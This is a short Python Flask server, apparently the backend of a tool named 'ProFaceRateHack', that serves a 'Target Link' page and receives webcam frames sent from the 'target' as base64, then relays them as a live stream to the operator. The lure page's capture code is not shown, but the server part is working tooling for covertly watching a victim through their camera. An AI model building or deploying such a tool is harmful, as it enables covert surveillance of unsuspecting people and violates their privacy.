from flask import Flask, render_template, request, Response
import base64
from PIL import Image
import io
import threading
import time

app = Flask(__name__, static_folder='../static', template_folder='../templates')

latest_frame = None
lock = threading.Lock()

@app.route('/target')
def target():
    return render_template('index.html')

@app.route('/stream', methods=['POST'])
def stream():
    global latest_frame
    try:
        # Ambil base64 dari target
        img_b64 = request.json['image'].split(',')[1]
        img_data = base64.b64decode(img_b64)
        
        # Buka dengan PIL (bukan cv2)
        img = Image.open(io.BytesIO(img_data)).convert('RGB')
        img = img.resize((640, 480))
        
        # Encode ulang jadi JPEG base64
        buffered = io.BytesIO()
        img.save(buffered, format="JPEG", quality=70)
        b64_jpg = base64.b64encode(buffered.getvalue()).decode()
        
        with lock:
            latest_frame = b64_jpg
            
    except Exception as e:
        print("Error:", e)
    return {"status": "ok"}

@app.route('/live')
def live():
    def gen():
        while True:
            with lock:
                if latest_frame:
                    yield f"data: {latest_frame}\n\n"
            time.sleep(0.1)
    return Response(gen(), mimetype='text/event-stream')

@app.route('/')
def home():
    return "<h2>ProFaceRateHack ACTIVE</h2><a href='/target'>Target Link</a>"
